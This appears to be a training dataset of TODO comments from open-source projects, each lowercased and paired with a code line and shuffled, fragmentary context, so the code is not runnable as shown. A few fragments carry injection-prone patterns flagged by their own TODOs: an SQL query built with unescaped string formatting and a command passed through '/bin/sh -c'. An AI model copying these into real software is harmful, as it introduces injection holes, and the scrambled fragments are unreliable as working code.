## \todo these dialogue methods should be available publicly. </s> dialogue._setwidget( messagewidget )	_load if sum( [ messageWidget.messageCount( level ) for level in ( IECore.Msg.Level.Error, IECore.Msg.Level.Warning ) ] ) : dialogue = GafferUI.Dialogue( "Errors Occurred During Loading" ) dialogue._addButton( "Oy vey" ) dialogue.waitForButton( parentWindow=parentWindow )
# todo - del just my poll, not the entire list ! </s> return poll_user_no_choice	survey_check_vote if survey.id in sess_nv: del request.session[SURVEY_NO_CHOICE_COOKIE_NAME] if request.user.is_authenticated(): sess = request.session.get(SURVEY_COOKIE_NAME, [])
# todo(rossella_s): get rid of it once we switch the db model to using </s> if 'mac_address' in result:	modify_fields_to_db def modify_fields_to_db(cls, fields): result = super(Port, cls).modify_fields_to_db(fields) result['mac_address'] = cls.filter_to_str(result['mac_address']) if 'distributed_port_binding' in result:
#todo: add type hints </s> markers = stdlib_utils.unique(	_unique_markers def _unique_markers(self, markers): markers, key=lambda m: m.id,
# todo: i should make sure to escape single quotes here </s> self._cursor.execute("select value from %s where key='%s'" % (self._name, key))	__getitem__ if not isinstance(key, basestring): raise ValueError("key must be a string") results = self._cursor.fetchall() if len(results) == 0:
# todo handle this special case for discord bridge users and </s> if user.user_id.startswith("@_discord_"):	add_user return short_name = shorten_sender(user.user_id) if user.display_name: short_name = user.display_name
# todo(andreaf) there is a fair amount of code that could me moved from </s> pass	setup_clients @classmethod def setup_clients(cls):
# todo: use different flag than .reentrant </s> endpt1 = colorsorter._transform_point(endpt1)	schedule_line appropriate. if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: endpt2 = ColorSorter._transform_point(endpt2) color = tuple(color) + (-1,)
# todo: is this the right str? </s> excstr = "runtimeerror('something went wrong',)"	test_active_exception ) received = self.vsc.received self.assert_vsc_received(received, [ self.expected_response(
# todo: import engines dynamically </s> if type == "ec2":	get_provider_class @classmethod def get_provider_class(cls, type): from .ec2 import Ec2Provider return Ec2Provider
# todo: remove in last pr for bug 1215587 </s> assert second_job.job_type.job_group.name == second_job_datum["job"]["group_name"]	test_ingest_job_with_updated_job_group assert second_job.job_group.name == second_job_datum["job"]["group_name"] assert first_job.job_group.name == first_job_datum["job"]["group_name"] assert first_job.job_type.job_group.name == second_job_datum["job"]["group_name"]
# todo(johnp): remove once bug 952618 is fixed in the glance client. </s> glanceclient = self.stub_glanceclient()	test_glance_exception_wrapping_for_internal_server_errors client's HTTP Internal Service Errors get converted to ClientConnectionError's. glanceclient.get_images_detailed().AndRaise( Exception("Internal Server error: "))
# todo: add error handling if multiscanner_process </s> report_id=report_id	multiscanner_process task_status='Complete',
# todo: remove safe_unescape_html when mako html safe comes in </s> 'name': u'{0}: {1}'.format(node.project_or_component.capitalize(), sanitize.safe_unescape_html(node.title))	_serialize_node children = [] return { if can_view else u'Private Component',
# todo: think how to resolve landscape.io warning: </s> return windll.user32.callnexthookex(self.keyboard_id, code, event_code, kb_data_ptr)	_keyboard_low_level_handler ActionLogger().log("{0}".format(sys.exc_info()[0])) finally:
# todo(mordred) add this back wnen ksa releases </s> host_found = false	test_get_host_no_detail self.assertNotIn('links', host['flavor']) self.assertNotIn('name', host['flavor']) for host in self.inventory.list_hosts(expand=False): if host['id'] == self.server_id:
# todo update timeout </s> if not self._local_sock:	on_local_read def on_local_read(self): return is_local = self._is_local
# todo: should this be limited for users with many projects / components? </s> nodes = list(	get_public_components def get_public_components(uid=None, user=None): user = user or User.load(uid) Node.find_for_user( user,
# todo implement </s> def test_validate_state_reachable_ignore_input():	test_validate_state_reachable_ignore_input pass
# @todo: use real lightness from hsv or lab color model </s> lightness_delta = sum(int_list_from_hex(theme_bg)) * (1 if is_dark_bg else -1) + \	_generate_theme_from_full_palette is_dark_bg = is_dark(theme_bg) max_possible_lightness = 255 * 3 max_possible_lightness // 6 min_lightness = max_possible_lightness // 38
""" todo """ </s> raise notimplementederror	visualize def visualize(self):
# todo: more tests </s> assert keanu is none	test_cannot_find_one_that_does_not_exist keanu = Person.find_one("Keanu Jones")
#todo: check system is stable, perhaps a utility in ctrlutil.py </s> d,v = np.linalg.eig(sys.a)	modred dico = 'C' for e in D: if e.real >= 0:
file_obj = data_path(data_files['spectra']) # todo: add images option </s> yield file_obj	get_readable_fileobj_mockreturn @contextmanager def get_readable_fileobj_mockreturn(filename, **kwargs):
# todo(tamaranorman) enable when these can be run on tpu </s> self.skiptest("test requires tpureplicator")	test_variable_creation_in_replica_context self.skipTest("Requires TPU") if golden.has_side_effects: strategy = tf.distribute.experimental.TPUStrategy() with strategy.scope():
# todo: +kwargs </s> else:	pull with remote.repo.git.custom_environment(**GitRepo.GIT_SSH_ENV): return remote.pull(**pull_kwargs) return remote.pull(**pull_kwargs)
pass # todo </s> def can_redo(self):	can_redo
# object. todo: change this to minimize subreddit get sizes. </s> if page.special:	POST_wiki_edit except ContentLengthError as e: self.handle_error(403, 'CONTENT_LENGTH_ERROR', max_length = e.max_length) setattr(c.site, ATTRIBUTE_BY_PAGE[page.name], content) setattr(c.site, "prev_" + ATTRIBUTE_BY_PAGE[page.name] + "_id", str(page.revision))
# todo: provide more informative errors </s> try:	create_policy arrangements with Ursulas. This is an unfinished API endpoint. You are probably looking for grant. request_data = json.loads(request.data) bob_pubkey = bytes.fromhex(request_data['bob_encrypting_key'])
# todo: return eigenvectors of modified fock matrix </s> return mf	uhf_stability if external: uhf_external(mf, verbose)
# todo: overhaul this method. </s> import queue	run_local_command def run_local_command( command, capture_output=True, stream_output=True ): wrapped_command = shlex.split( "/bin/sh -c '%s'" % command ) stdout_queue = Queue()
# todo:  make these lists permanent attributes of self, so they don't need to be created </s> model_grads = [mmp[0].grad.data for mmp in model_master_params if mmp[0].grad is not none]	unscale if scale == 1.0 and all_same and not self.dynamic: return master_grads = [mmp[1].grad.data for mmp in model_master_params if mmp[1].grad is not None] self.unscale_grads_python(model_grads, master_grads, scale)
# todo some kind of non-zero check to make sure that this passes. </s> sentry.initialize('')	create_db def create_db(c):
# todo also check for motion codec parameter support </s> return 'h264_omx' in codecs	has_h264_omx_support if not binary: return False
# todo in python 2.7 or later, this should be </s> only = set(only) | set(['type', 'id'])	DefaultSerializer .. _Flask request context: http://flask.pocoo.org/docs/0.10/reqcontext/ if only is not None: model = type(instance) try:
# @todo: remove this if in 0.6 </s> if isinstance(node_id, node):	ex_create_ip_group def ex_create_ip_group(self, group_name, node_id=None): node_id = node_id.id group_elm = ET.Element(
# todo: replace this with something, that notifies the user but </s> horizons.main.gui.show_popup(_('quicksave'), _('your game has been saved'))	quicksave success = horizons.main.save_game(horizons.main.savegamemanager.create_quicksave_filename()) if success: horizons.main.savegamemanager.delete_dispensable_savegames(quicksaves = True)
# todo: the following check is not optimal yet. when a </s> if node.is_alive():	start_node break node = node_queue.get() log.info("Not starting node %s which is " "already up&running.", node.name)
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: actually we should register for all compile time constant values, and know </s> sliceregistry.registerslicehandler(	register def register(): kind    = CPythonExpressionConstantRef.kind, handler = computeConstantSlice
# # todo: add to the operation history that this happened </s> operation = xformoperation(user=system_user_id, date=datetime.utcnow(), operation='scrub username for '	replace_username_in_metadata_for_couch form_data.put_attachment(form_attachment_new_xml, name="form.xml", content_type='text/xml') form_data.save() 'GDPR compliance.') return operation
# todo: icon by mime-type </s> pixbuf = self.render_icon(gtk.stock_file, gtk.icon_size_button)	refresh if file.isdir(): continue # Ignore subfolders -- FIXME ? self.store.append((name, pixbuf)) # BASENAME_COL, PIXBUF_COL self.thumbman.get_thumbnail_async(file, ICON_SIZE, self.async_callback)
#todo: add method </s> summaryinfo = {'title': 'show title', 'year': 2015, 'ids': {'imdb': data['imdbnumber']}}	doManualRating userInfo = {'ratings' : globals.traktapi.getEpisodeRatingForUser(data['imdbnumber'], data['season'], data['episode'])} elif utilities.isShow(media_type): userInfo = {'ratings': {}} elif utilities.isMovie(media_type):
# todo add test for reversed endianning </s> assert signal_big.getstartbit(startlittle=true) == 17  # looking for "end" of the signal: 2 + (16 - 1)	test_signal_get_startbit_conversion signal_big = canmatrix.canmatrix.Signal(startBit=2, size=16, is_little_endian=False)
# todo: find a better random value </s> return datetime.datetime.now()	_auto_value def _auto_value(self, prop): if prop.type == datetime.datetime: elif prop.type == datetime.date: return datetime.date.today()
# todo: drape topography? </s> m = np.c_[mx, np.zeros_like(mx)]	genDCSurvey_2D Nx = self.RxLoc[self.RxID[self.SrcID == iSrc], 1] Ax = self.SrcLoc[iSrc, 0] N = np.c_[Nx, np.zeros_like(Nx)] A = np.r_[Ax, 0.].reshape([1, -1])
# todo - remove the following once biosql bug 2839 is fixed. </s> if driver in ["psycopg", "psycopg2", "pgdb"]:	open_database conn = connect(dsn) server = DBServer(conn, module) sql = "SELECT ev_class FROM pg_rewrite WHERE " + \ "rulename='rule_bioentry_i1' OR " + \
# todo: test for last revision on first page. </s> offset = url_for(controller='revision', action='list')	test_list_long self.create_100_revisions() try: res = self.app.get(offset) self.assert_click(res, '2', 'Revision 2')
# todo: import from `py-evm` if possible?.. </s> def generate_ignore_fn_for_fork(passed_fork):	generate_ignore_fn_for_fork if passed_fork: passed_fork = passed_fork.lower()
# todo make sure this works </s> log("creating motors...", 'info')	buildModelFromDictionary else: log("  No sensors in model.", 'INFO') if 'motors' in model and model['motors']: for motor in model['motors']:
# todo - needs tests </s> def decorator(request, *args, **kwargs):	subscription_payment_required def subscription_payment_required(view_func): if request.user.is_anonymous(): raise ImproperlyConfigured("ERROR_MSG")
# todo check the op returned a view </s> elif vmap and idx in vmap:	summary_memory if dmap and idx in dmap: node_memory_saved_by_inplace += v node_memory_saved_by_view += v else:
# todo(mattjj,levskaya): re-enable when test failure is sorted out </s> raise skiptest("tfp test failures")	testLogspace def testLogspace(self, start_shape, stop_shape, num, endpoint, base, dtype, rng_factory): if (dtype in int_dtypes and jtu.device_under_test() == "gpu" and
# todo find out what is best used here! </s> 'preferred_dtype' : none}	get_meta_information 'is_deterministic': True, 'handles_sparse': True,
# todo: switch _ignore_connection_aborted for _ignore_transmission_error, or provide retry mechanism </s> if self._ignore_connection_aborted:	_fuzz_current_case self._fuzz_data_logger.log_fail("Target connection reset.") except sex.BoofuzzTargetConnectionAborted as e: self._fuzz_data_logger.log_info("Target connection lost (socket error: {0} {1}): You may have a " "network issue, or an issue with firewalls or anti-virus. Try "
# todo: sublime text seems to ignore the 'extend' param to ctrl+d, so disable it. </s> vi_cmd_data['motion']['command'] = 'vi_no_op'	vi_ctrl_f vi_cmd_data['motion']['args'] = {'by': 'pages', 'forward': True} if vi_cmd_data['mode'] != MODE_NORMAL: vi_cmd_data['motion']['args'] = {} return vi_cmd_data
# todo implement. </s> pass	AsynchronousEAMSGDWorker Y = np.asarray([x[self.label_column] for x in label_iterator]) if self.iteration % self.communication_window == 0: model.train_on_batch(X, Y) self.iteration += 1
##todo : even/odd </s> keyw = ('fixed', max_key_len + 1,	HeadersList max_key_len = len(key) for key, value in lines: urwid.Text(('message_header_key', key))) valuew = urwid.Text(('message_header_value', value))
# todo: remove when we stop supporting python < 3.5 </s> if sys.version_info.major < 3 or sys.version_info.minor < 5:	transform X_embedded : `numpy.ndarray`, shape=(n_samples, n_components) The embedded data points. check_is_fitted(self, ['preprocessor_', 'components_']) else:
# todo: use ids in db, instead of objects! </s> return abstract_type.id == self._contrib_type_id	_satifiesContribType if not abstract_type: return False return False
# todo get from cache </s> line_numbers = windowlayout.line_numbers_status(view)	calc_view_width_offset def calc_view_width_offset(self, view): return [ self.get_setting('imesupport_view_frame_left'),
# todo: split is int </s> split = all_splits  # type: ignore	Labeler self.lfs = lfs if docs: super().apply( docs,
# todo(devcamcar): this assert should be more specific. </s> self.asserttrue(len(roles) > 0)	test_role_list client = self.foo_client() roles = client.roles.list()
# todo equip `unique()` with a tolerance </s> _, idx, inv = numpy.unique(	data_from_facets def data_from_facets(facets): pts = numpy.concatenate(facets) pts, axis=0, return_index=True, return_inverse=True
# todo: test coverage for this branch. </s> logger.error(	send_message message.send() except Exception as e: ugettext(u'Message %(subscription)s failed ' u'with error: %(error)s'),
pass  # todo </s> elif action == 'execute':	multisig pass  # TODO
{# todo do not show this. #}''') </s> with open(sub_path, 'w') as f:	test_with_template_dirs with open(template_path, 'w') as f: f.write('''{# FIXME This is a comment. #} f.write('''{# FIXME This is a second comment. #} {# TODO Do not show this. #}''')
# todo handle numpy repr differences </s> if isinstance(a, np.ndarray):	numpy_repr def numpy_repr(a): opts = np.get_printoptions() return "array(" + repr(list(a)) + ")" try:
# todo delete? we should search for valid parser </s> completions += self._simple_complete(path, dot, like)	get_completions if not path and not dot: completions += ((k, b) for k in keywords.keyword_names(all=True)) return completions
# todo: check </s> 'first name': child['child_first_name'],	push_child_entities dhis2_child_id = result['Identity'] event_data = { 'Last Name': child['last_name'],  # ? 'Date of Birth': child['dob'],
# todo: second loop can be removed with using segment_axis. no large gain. </s> for tau_minus_delay in range(0, k):	perform_filter_operation_v4 _, T = Y.shape X = np.copy(Y)  # Can be avoided by providing X from outside. X[:, (delay + K - 1):] -= np.einsum( 'de,dt',
# todo: weather data source changed, temporarily disable, will enable it later when new data source is available. </s> self._is_temp = is_temp	CitiBikeTopology super().__init__() self._data_pipeline["trip"] = CitiBikePipeline(topology, trip_source, station_info, is_temp) def __del__(self): if self._is_temp:
# todo wonder if old takeouts could contribute as well?? </s> total = 0	load_locations logger = get_logger() # TODO count errors? last_takeout = max(TAKEOUTS_PATH.glob('takeout*.zip')) errors = 0 with kompress.open(last_takeout, 'Takeout/Location History/Location History.json') as fo:
# todo yield </s> dataset.unlock(filename)	datalad_plugin message='file already exists, and not appending content') return with open(filename, 'a' if existing == 'append' else 'w') as fp: fp.write(default_content)
# todo: docstring </s> feed_dict = self._create_item_feed_dict(item_features_matrix=item_features)	predict_item_bias def predict_item_bias(self, item_features): predictions = self.tf_projected_item_biases.eval(session=get_session(), feed_dict=feed_dict) return predictions
# todo: remove in 21.08 </s> log.warning("this method is deprecated, use phonemefile.save")	save_phonemes key (str):        Hash key for the sentence phonemes (str):   phoneme string to save cache_dir = mycroft.util.get_cache_directory("tts/" + self.tts_name) pho_file = os.path.join(cache_dir, key + ".pho")
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> sampleparameters = {	test_acquire_token_with_user_pass def test_acquire_token_with_user_pass(self): "tenant" : "common", "authorityHostUrl" : "https://login.windows.net",
# todo implement this function </s> :return:	send_UI_event :param uievent: instance of UIevent
# todo: remove in 0.24 </s> def test_dict_learning_no_shadowing():	test_dict_learning_no_shadowing with warnings.catch_warnings(): warnings.simplefilter("ignore", category=FutureWarning)
# todo: give a vanilla example </s> .. math::	error_energy def error_energy(predicted_power, df_appliances_ground_truth): error^{(n)} = \\left | \\sum_t y^{(n)}_t - \\sum_t \\hat{y}^{(n)}_t \\right |
# todo:  check this </s> inp_keys.append(hdkey(ck.child_key.wif, network=ck.child_key.network_name).key)	_objects_by_key_id inp_keys = [] for ck in key.multisig_children: script_type = 'p2sh_multisig' elif key.key_type in ['bip32', 'single']:
# todo check that it actually does something useful </s> from sklearn import pipeline, datasets	test_pipeline def test_pipeline(): X, y = datasets.make_blobs(random_state=0) clf = pipeline.Pipeline(
# todo: batch this up properly once we care about multi-project rules. </s> enable_snuba_subscription(subscription)	bulk_enable_snuba_subscriptions :return: for subscription in subscriptions:
# todo: this algorithm has lots of room for improvement </s> if len(req0x01.content) != len(req0x02.content):	Origin print(color.GREEN+' [+] Endoint '+color.ORANGE+'Origin Validation'+color.GREEN+' Present!') print(color.GREEN+' [-] Heuristics reveal endpoint might NOT be vulnerable...')
# todo: add here additional variants for other reprog_controls </s> if self.keys[index] is none:	__getitem__ if index < 0 or index >= len(self.keys): raise IndexError(index) keydata = feature_request(self.device, FEATURE.REPROG_CONTROLS, 0x10, index) self.keyversion=1
z_t = gan.encoder.z #todo </s> inputs_t = gan.inputs[0]	_sample def _sample(self): gan = self.gan inputs = np.linspace(0,1, 4) y = np.linspace(0,1, 6)
# self.todolist was loaded with old identifier settings </s> todolist = load_file_to_todolist("test/data/listcommandtest.txt")	test_list50 default alphabet. config(p_overrides={('topydo', 'identifier_alphabet'): 'a', ('topydo', 'identifiers'): 'text'}) command = ListCommand(["-F", "%I", "Foo"], todolist, self.out, self.error) command.execute()
# todo: wrap backend call in error handling. </s> return backend.playback.get_time_position().get()	get_time_position backend = self._get_backend(self.get_current_tl_track()) if backend: else: return 0
# todo: set globals to user module </s> return types.lambdatype(marshal.loads(pickled_callable), globals())	unpickleLambda def unpickleLambda(pickled_callable):
pass  # todo - should this do something </s> press "leave domain" on users tab	on_btleavedomain_clicked def on_btleavedomain_clicked(self, widget, data=None):
# todo: incref? </s> out_view.data = data_ptr	pre_alloc_str_arr_view out_view.index_offsets = view_payload.index_offsets out_view.data_offsets = view_payload.data_offsets out_view.meminfo = meminfo ret = out_view._getvalue()
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_start_and_end def test_start_and_end(self): Scanning the Tangle for all transfers, with start and end indices.
# todo add test for this </s> if order >= 3:	Affine return_matrices=True) for heatmaps_i, arr_aug, matrix, order in zip(heatmaps, arrs_aug, matrices, order_samples): arr_aug = np.clip(arr_aug, 0.0, 1.0, out=arr_aug) heatmaps_i.arr_0to1 = arr_aug
err = str(e)  #@todo: recheck in 0.4.10 </s> if self.premium:	process self.checkFile() except Fail, e:  #@TODO: Move to PluginThread in 0.4.10 self.logWarning(_("Premium download failed")) self.retryFree()
# todo: this should be a separate test </s> self.asserttrue(iterable.closed, true)	test_systemexit_is_captured with self.assertRaises(SystemExit): response = list(response) self.assertEquals(len(self.client.events), 1) event = self.client.events.pop(0)
verifying_key = bytes.fromhex(verifying_key)  # todo: move / validate </s> if not encrypting_key:	create if not verifying_key: verifying_key = click.prompt('Enter Verifying Key', type=click.STRING) encrypting_key = click.prompt('Enter Encrypting Key', type=click.STRING) encrypting_key = bytes.fromhex(encrypting_key)  # TODO: Move / Validate
# todo check error message here. </s> assert response.status_code == 400	test_set_null data=dumps(data))
# todo: ... </s> session = dbsessionfactory.create_session()	__record_purchase amount_paid: float, description: str):
if self._ndim == 3: # todo: use hasz </s> array.append(self.z)	array def array(self): array = [self.x, self.y] return array
# todo legacy method to be removed/refactored </s> from corehq.apps.locations.models import location	locations @property def locations(self): from corehq.apps.commtrack.models import SupplyPointCase def _get_linked_supply_point_ids():
# todo counts as yes if vhnd was not available </s> return len([c for c in self.cases	vhnd_monthly @property def vhnd_monthly(self): if c.preg_attended_vhnd or c.child_attended_vhnd])
# todo policyuniverse can't expand resource wildcards so further thought is needed here </s> session.run(	load_group_policies for policy_name, policy_data in policies.items(): for role_arn in _find_roles_assumable_in_policy(policy_data): ingest_policies_assume_role, GroupName=group_name,
# todo fix. </s> self.assertequals(reil_ctx_out["rax"], res)	test_movd_2 res = 0x0000000012345678 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["mm0"], ctx_init["mm0"])
# todo: accept multiple trade_ids (just extend list below (+ extend params?)) </s> data = {'auctioninfo': [{'id': trade_id}]}	send_to_tradepile def send_to_tradepile(self, trade_id): params = {'tradeId': trade_id} self.r.headers['X-HTTP-Method-Override'] = 'PUT'  # prepare headers
# todo: is this the original intent of this test? </s> self.assertraises(typeerror, _update_metadata, 'targets', none)	test_3__update_metadata _update_metadata = self.Repository._update_metadata self._mock_download_url_to_tempfileobj(self.release_filepath) self._mock_download_url_to_tempfileobj(self.targets_filepath) _update_metadata('targets',
# todo: normal gl requires these lines, es 2.0 does not </s> from opengl import gl	on_paint gl.glClearColor(0,0,0,1); gl.glClear(gl.GL_COLOR_BUFFER_BIT | gl.GL_DEPTH_BUFFER_BIT) gl.glEnable(GL.GL_PROGRAM_POINT_SIZE) gl.glEnable(GL.GL_POINT_SPRITE)
self.reads_matched += 1  # todo move to filter class </s> return trimmed_read	AdapterCutter trimmed_read = read trimmed_read.match = matches[-1]
# todo: check if optional or required </s> checked.append(parameter.parameters)	check_method logger.debug(parameter) assert param is not None ignored = IGNORED_PARAMETERS.copy() if name == 'getUpdates':
# todo: remove this </s> warnings.warn(	in_boundary :param position: (x, y, z) :return: True if the position is inside the box otherwise False f"in_boundary is going to be removed\n{''.join(traceback.format_stack())}", DeprecationWarning,
# todo: this should now raise an exception </s> model = dqn.modelwrapper(	test_model_predict_wrong_shape def test_model_predict_wrong_shape(): state_axes=1, action_size=2, batch_size=3, model=small_model )
# todo: algorithm to collect missing target counters </s> counter_value = target_counter_values.get(	compute_content_list target_counter_values = \ lookup_target.target_box.cached_counter_values counter_name, [0])[-1] texts.append(counters.format(counter_value, counter_style))
# todo when there is already data in this packet </s> else:	_handle_dns_resolved self._loop.add(remote_sock, eventloop.POLL_ERR) self._update_stream(STREAM_UP, WAIT_STATUS_READING) try: remote_sock.connect(sa)
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: non standard, expects 299 and aux outputs </s> raise notimplementederror()	replace_head raise NotImplementedError() elif isinstance(model, torchvision.models.Inception3): else: raise NotImplementedError(f"Model {model} not supported")
# todo: clear last object inspector requests dictionary </s> assert cmd.get("source")	_cmd_Run def _cmd_Run(self, cmd): self._execute(cmd.source, timeout=SECONDS_IN_YEAR, capture_stdout=False) return {}
# todo(tdurakov): remove dict to object conversion once rpc api version </s> got_migrate_data_object = isinstance(dest_check_data,	check_can_live_migrate_source is_volume_backed = compute_utils.is_volume_backed_instance(ctxt, instance) migrate_data_obj.LiveMigrateData) if not got_migrate_data_object:
# todo: implement this rpc service </s> return empty_pb2.empty()	push_gradient def push_gradient(self, request, _):
# todo: update the associated revision if there is one </s> phlgit_push.delete(clone, wb.branch, remote)	processOrphanedBranches print "delete orphaned branch: " + wb.branch
# todo(a_d) event is unused </s> def update_location(event=none):	update_location Call inara_notify_location in this and other interested plugins with Inara's response when changing system or station
return # todo raise error </s> if value is none:	set_Volume if not self.get_CanControl(): logger.debug(u'Setting %s.Volume not allowed', PLAYER_IFACE) return elif value < 0:
#todo - use sql for this, much more efficient! </s> return len(self.adaptor.list_bioentry_ids(self.dbid))	__len__ def __len__(self):
# todo implement .!{cmd} (ex shell out) test for windows </s> self.assertcontent('"one" \'two\'\n')	test_command_escaping })
# todo: min() is to support mono sources with default channel mapping. handle this better, and give a warning if an explicit mapping is too big. </s> for i in xrange(0, min(len(channel_mapping[0]),	_AudioRXDriver channel_matrix = blocks.multiply_matrix_ff(channel_mapping) combine = blocks.float_to_complex(1) self.__source.output_signature().max_streams())): self.connect((self.__source, i), (channel_matrix, i))
# todo: remove in 1.2 </s> return self._deprecated_fit	fit_ def fit_(self):
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study()	test_plot_intermediate_values trial.report(2.0, step=1) return 0.0 study.optimize(lambda t: objective(t, True), n_trials=1) figure = plot_intermediate_values(study)
# todo(shoyer): test fails on tpu </s> if jtu.device_under_test() == "tpu":	test_root_scalar def test_root_scalar(self): raise SkipTest("Test fails on TPU") def scalar_solve(f, y):
# todo: merge the logic to map_partitions </s> return _rename(self._pd.name, series)	rename_name def rename_name(series):
# todo add code </s> p = poll.objects.get()	test_delete def test_delete(self): p.delete() self.assertEqual(Poll.objects.count(), 0)
# todo: zglobs.to_filespecs does not match files in the current directory when a pattern </s> self.assertequals(self.test_exclude_files - {'dir1/ab.py', 'dir1/aabb.py', 'dir1/dirdir1/ab.py'},	test_exclude_zglobs def test_exclude_zglobs(self): test_out = self._extract_exclude_output('exclude_zglobs') test_out)
#todo(jogo): make the following doctests pass: </s> pos = physical_line.find('todo')	hacking_todo_format H101: #TODO (jogo) fail Okay: TODO = 5 pos1 = physical_line.find('TODO(') pos2 = physical_line.find('#')  # make sure it's a comment
# todo: abstract py 2/3 check out to utils </s> if sys.version_info[0] < 3:	fetch_preload_pending pending_url = "https://hstspreload.org/api/v2/pending" request = requests.get(pending_url) raw = request.content else:
# todo: remove when old stats are removed </s> old_stats = store0.get_stats()	test_data_tool_store_get_stats def test_data_tool_store_get_stats(store0): stats = store0.data_tool.get_stats() assert ( sorted(old_stats.keys())
# todo(rakhmerov): implement. </s> pass	test_rollback def test_rollback(self):
node_list = ursula.batch_from_bytes(nodes, federated_only=self.federated_only)  # todo: 466 </s> new_nodes = []	learn_from_teacher_node signature, nodes = signature_splitter(response.content, return_remainder=True) from nucypher.characters.lawful import Ursula for node in node_list: if node.checksum_public_address in self.known_nodes or node.checksum_public_address == self.checksum_public_address:
#todo: manage this </s> pass	get_return_description_indexes end = idx_abs if self.type in ['params', 'unknown'] and (start, end) == (-1, -1): return (start, end)
# todo: proper pluralization </s> raise validationerror(	clean ) elif len(selected) < self.iao.min_count: _(error_messages['addon_min_count']), 'addon_min_count',
# todo: test. </s> starts = [self._bb_by_addr[bb_addr].start_address for bb_addr in self._bb_by_addr.keys()]	start_address @property def start_address(self): return min(starts)
# todo(stephenfin): there are some issues here that may </s> graphics.keymap = conf.spice.keymap	_guest_add_video_device graphics.type = "spice" if CONF.spice.keymap: graphics.listen = CONF.spice.server_listen guest.add_device(graphics)
# todo: add exception handling </s> connection = pika.blockingconnection(pika.connectionparameters(host="rabbitmq", port=5672))	_send_listens_to_queue submit.append(listen) if submit: channel = connection.channel() channel.exchange_declare(exchange='incoming', type='fanout')
# todo: this property is only used by the mvpformindicatorpillow </s> instance.initial_processing_complete = true	process_xforms_for_cases domain=domain, ) cases = case_db.get_cases_for_saving(instance.received_on) self.interface.save_processed_models(instance, xforms, cases)
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo: should we add a test case for an empty context stack? </s> return self.top()	get TODO: explain the rationale for this difference in treatment. if name == '.': parts = name.split('.') result = self._get_simple(parts[0])
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo(morgan): rework this to not need an explicit token render as </s> values = super(requestcontext, self).to_policy_values()	to_policy_values oslo_policy.policy.Enforcer.enforce() if oslo.policy knows it's dealing with a context object. values['token'] = self.token_reference['token'] values['domain_id'] = self.domain_id if self.domain_id else None
# todo generator </s> raise skiptest	test_our_metadataset_search assert list(ds.search('.', report='*')) assert list(ds.search('.', report_matched=True))
# todo: wells if display config has more than one column </s> "put_loners_in_wells": false	render_form "cases": cases, "form_table_options": { }, "form_meta_data": form_meta_data,
def __init__(self, p_args, p_todolist, #pragma: no branch </s> p_out=lambda a: none,	__init__ p_err=lambda a: None, p_prompt=lambda a: None):
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
# todo: truffle change begin </s> return d & 0xffffffff, h & 0xffffffff	RND h  = t0 + t1;
# todo: test </s> return gather_impl	gather_scalar_overload gather_impl = loc_vars['gather_scalar_impl']
# todo: remove "get_" from the name </s> returns a sampling tree for the specified head node types	get_sampling_tree def get_sampling_tree(self, head_node_types, n_hops): for neighbours up to n_hops away. A unique ID is created for each sampling node.
# todo: make this configurable </s> count = 100	get_authentication_item ret = {} if token_type.lower() == "hotp": toks = get_tokens(serial=serial) if len(toks) == 1:
# todo: using json.dumps because node_to_use.registered_meta's values are </s> draft = node.register_node(auth)	node_draft_template_page_post redirect_url=node.url ) return { 'status': 'success',
# todo this is a bit jankey to be honest </s> if apps_changed:	ready settings.INSTALLED_APPS += [plugin_path] apps_changed = True apps.app_configs = OrderedDict() apps.apps_ready = apps.models_ready = apps.loading = apps.ready = False
# todo: proper java error? </s> raise runtimeerror('could not find class \'%s\' for jnienv.' % name)	find_class clazz = self._class_loader.find_class_by_name(name) if clazz is None: return clazz.jvm_id
# todo: still hardcoded. </s> return true	hasMaterials @pyqtProperty(bool) def hasMaterials(self):
# todo remove in v8 </s> self.compile_html(source, dest, is_two_file)	compile def compile(self, source, dest, is_two_file=False, post=None, lang=None):
# todo: remove debug statements after fixing in-toto/in-toto#171 </s> log.debug("{0} (stdout):{1}".format(command, process.stdout))	get_version process = in_toto.process.run(command, stdout=in_toto.process.PIPE, stderr=in_toto.process.PIPE, universal_newlines=True) log.debug("{0} (stderr):{1}".format(command, process.stderr)) full_version_info = process.stdout
# todo only return these if there have been changes </s> for package in versioned_packages:	_perform_download_packages_from_repository rpm_version=rpm_version) for package in intent.packages] intent.target_path.child(package).setContent(package) return versioned_packages
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
f.write(self.pastie_content.encode('utf8'))  # todo error checking </s> f = open(directory + os.sep + self.id, 'w')	savePastie raise SystemExit('BUG: Content not set, sannot save')
# todo(wb): it doesn't sense for this to be here if varianttypenode </s> return true	BXmlNode (self) def verify(self): def _children(self, max_children=None, end_tokens=[SYSTEM_TOKENS.EndOfStreamToken]):
# todo in python 2.7 or later, this should be a set comprehension. </s> exclude = set(get_column_name(column) for column in exclude)	__init__ only |= set(['type', 'id']) if exclude is not None: self.default_fields = only self.exclude = exclude
# todo: this should be abstracted into a property/method or something </s> if region.inherited and not contents and hasattr(obj, 'parent_id') and obj.parent_id:	collect_items def collect_items(obj): contents = obj._content_for_region(region) return collect_items(obj.parent) return contents
